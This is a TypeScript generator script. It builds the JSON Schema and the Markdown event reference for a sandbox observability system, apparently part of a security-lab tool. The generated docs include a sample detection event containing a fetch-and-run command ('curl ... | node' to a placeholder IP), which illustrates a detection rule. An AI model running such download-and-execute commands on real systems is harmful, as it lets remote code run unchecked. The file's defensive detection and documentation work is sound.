// Generates tabd/schema/event.v1.json and docs/tabd/EVENTS.md from tabd/src/obs/schema.ts and
// the detection rules (single source of truth). Run in a network-less node container:
//   node tabd/tools/gen-obs-docs.ts write   regenerate
//   node tabd/tools/gen-obs-docs.ts check   exit 1 if either file drifted (docs-check)

import * as fs from 'node:fs';
import * as path from 'node:path';
import { RULES } from '../src/obs/detect.ts';
import { CLASSES, INTEGRITY, LIMITS, OBSERVATION_STATES, PRIORITIES, SCHEMA_VERSION, SOURCES } from '../src/obs/schema.ts';

const repo = path.resolve(import.meta.dirname, '../..');
const SCHEMA_FILE = path.join(repo, 'tabd/schema/event.v1.json');
const DOC_FILE = path.join(repo, 'docs/tabd/EVENTS.md');

function jsonSchema(): unknown {
	const str = (max: number) => ({ type: 'string', maxLength: max });
	return {
		$schema: 'https://json-schema.org/draft/2020-12/schema',
		$id: 'https://seclab.dev/tabd/event.v1.json',
		title: 'seclab tab observability event',
		description: 'Generated from tabd/src/obs/schema.ts by tabd/tools/gen-obs-docs.ts; do not edit.',
		type: 'object',
		additionalProperties: false,
		required: ['v', 'seq', 'time', 'tabId', 'source', 'integrity', 'class', 'priority', 'summary'],
		properties: {
			v: { const: SCHEMA_VERSION },
			seq: { type: 'integer', minimum: 1, description: 'Per-tab sequence number assigned by the supervisor; contiguous in the log.' },
			time: { type: 'string', format: 'date-time', description: 'Supervisor receive time (trusted clock).' },
			tabId: { type: 'string', pattern: '^t-[a-z2-7]{26}$' },
			source: { enum: Object.keys(SOURCES) },
			integrity: { enum: Object.keys(INTEGRITY) },
			class: { enum: Object.keys(CLASSES) },
			priority: { enum: [...PRIORITIES] },
			summary: str(LIMITS.summary),
			rule: { type: 'string', pattern: '^[a-z][a-z0-9.-]{0,63}$' },
			proc: {
				type: 'object', additionalProperties: false,
				properties: {
					pid: { type: 'integer' }, ppid: { type: 'integer' }, uid: { type: 'integer' }, exe: str(LIMITS.exe),
					argv: { type: 'array', maxItems: LIMITS.argvItems + 1, items: str(LIMITS.argvItem) },
					lineage: { type: 'array', maxItems: LIMITS.lineage, items: { type: 'object', additionalProperties: false, required: ['pid', 'exe'], properties: { pid: { type: 'integer' }, exe: str(LIMITS.exe) } } },
				},
			},
			file: { type: 'object', additionalProperties: false, required: ['path'], properties: { path: str(LIMITS.path), op: str(32) } },
			net: { type: 'object', additionalProperties: false, required: ['addr'], properties: { addr: str(LIMITS.addr), port: { type: 'integer', minimum: 0, maximum: 65535 }, family: { enum: ['inet', 'inet6', 'unix', 'other'] }, result: str(64) } },
			detail: {
				type: 'object', maxProperties: LIMITS.detailKeys, propertyNames: { pattern: '^[a-zA-Z][a-zA-Z0-9_.]{0,31}$' },
				properties: { ref: { type: 'string', pattern: '^(?:rpc|cmd|chan):[\\x21-\\x7e]{1,1024}$' } },
				additionalProperties: { oneOf: [str(LIMITS.detailValue), { type: 'number' }, { type: 'boolean' }] },
			},
			cause: { type: 'array', maxItems: LIMITS.cause, items: { type: 'integer', minimum: 1 } },
			sensorTime: { type: 'string', format: 'date-time', description: 'Sensor clock; tab-controlled for in-tab sensors.' },
			redacted: { const: true, description: 'A redaction pattern matched somewhere in this event.' },
		},
	};
}

function table(head: string[], rows: string[][]): string {
	const esc = (s: string) => s.replace(/\|/g, '\\|');
	return [`| ${head.join(' | ')} |`, `|${head.map(() => '---').join('|')}|`, ...rows.map(r => `| ${r.map(esc).join(' | ')} |`)].join('\n');
}

function doc(): string {
	return `# Tab observability events, v${SCHEMA_VERSION}

<!-- Generated from tabd/src/obs/schema.ts and tabd/src/obs/detect.ts by tabd/tools/gen-obs-docs.ts; do not edit. -->

Design: [ADR tab observability](../adr/20261104-tab-observability.md). JSON Schema:
[\`tabd/schema/event.v1.json\`](../../tabd/schema/event.v1.json). Protocol methods:
[PROTOCOL.md](PROTOCOL.md) §3 (\`tab.events.*\`, \`tab.observe\`).

Each tab has one ordered stream. The supervisor stamps \`v\`, \`seq\`, \`time\` and \`tabId\` and
validates, redacts, escapes and caps every field (\`tabd/src/obs/schema.ts\` \`normalizeDraft\`). Field
names follow Falco's JSON output where they overlap; \`seclab tab logs --format falco\` renders
Falco-compatible lines for SIEM forwarders, tagged with the OCSF \`class_uid\` below.

**Never base a security decision on an event whose \`integrity\` isn't \`trusted\`.**

## Integrity
${table(['`integrity`', 'Meaning'], Object.entries(INTEGRITY).map(([k, v]) => [`\`${k}\``, v]))}

A \`detection\` takes the weakest integrity of its causes.

## Sources
${table(['`source`', 'Integrity', 'What'], Object.entries(SOURCES).map(([k, v]) => [`\`${k}\``, v.integrity === 'derived' ? 'weakest cause' : `\`${v.integrity}\``, v.desc]))}

## Classes
${table(['`class`', 'OCSF `class_uid`', 'Meaning'], Object.entries(CLASSES).map(([k, v]) => [`\`${k}\``, String(v.ocsf), v.desc]))}

## Priorities
Falco's names, highest first: ${PRIORITIES.map(p => `\`${p}\``).join(', ')}.

## Observation states
Reported in \`tab.observation\` notifications, \`tab.events.tail\` results and \`sensor.status\` events.

${table(['State', 'Meaning'], Object.entries(OBSERVATION_STATES).map(([k, v]) => [`\`${k}\``, v]))}

## Detection rules
${table(['`rule`', 'Default priority', 'Fires when'], RULES.map(r => [`\`${r.id}\``, `\`${r.priority}\``, r.desc]))}

## Limits
${table(['Field', 'Limit'], Object.entries(LIMITS).map(([k, v]) => [`\`${k}\``, String(v)]))}

Lines from an in-tab sensor longer than 64 KiB are dropped and counted. Each tab is rate-limited
(sensor events 500/s, burst 5 000; host events 200/s, burst 2 000); drops are summarised once a
second as \`sensor.status\` and mark the tab \`degraded\`. The log keeps 4 × 8 MiB segments per tab
under \`<state>/events/<tabId>/\`.

## Example
\`\`\`json
{"v":1,"seq":42,"time":"2026-11-04T22:42:01.517Z","tabId":"t-abcdefghijklmnopqrstuvwxyz","source":"detector","integrity":"tab-vm-root","class":"detection","priority":"critical","rule":"loader.pipe-to-interpreter","summary":"download piped to an interpreter: sh -c curl -s http://192.0.2.10/p | node","proc":{"pid":388,"ppid":387,"exe":"/usr/bin/dash","argv":["sh","-c","curl -s http://192.0.2.10/p | node"],"lineage":[{"pid":387,"exe":"/bin/sh"}]},"cause":[41]}
\`\`\`
`;
}

const want = new Map([[SCHEMA_FILE, `${JSON.stringify(jsonSchema(), null, '\t')}\n`], [DOC_FILE, doc()]]);
const mode = process.argv[2];
if (mode === 'write') {
	for (const [f, c] of want) {
		fs.mkdirSync(path.dirname(f), { recursive: true });
		fs.writeFileSync(f, c);
	}
	console.log('obs docs: written');
} else if (mode === 'check') {
	const drift = [...want].filter(([f, c]) => !fs.existsSync(f) || fs.readFileSync(f, 'utf8') !== c).map(([f]) => path.relative(repo, f));
	if (drift.length) {
		console.error(`obs docs: out of date: ${drift.join(', ')} (run: ./seclab docs write)`);
		process.exit(1);
	}
	console.log('obs docs: ok');
} else {
	console.error('usage: gen-docs.ts write|check');
	process.exit(2);
}
